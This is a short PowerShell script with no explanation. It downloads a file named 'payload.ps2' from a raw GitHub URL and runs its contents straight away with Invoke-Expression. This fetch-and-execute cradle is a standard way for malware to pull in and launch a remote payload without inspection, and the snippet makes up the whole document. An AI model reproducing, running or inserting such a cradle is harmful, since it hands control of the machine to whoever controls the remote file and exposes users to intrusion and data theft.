$url = "https://raw.githubusercontent.com/YZUs1121518/WATmidle/refs/heads/main/payload.ps2"
$script = [System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData($url))
IEX $script
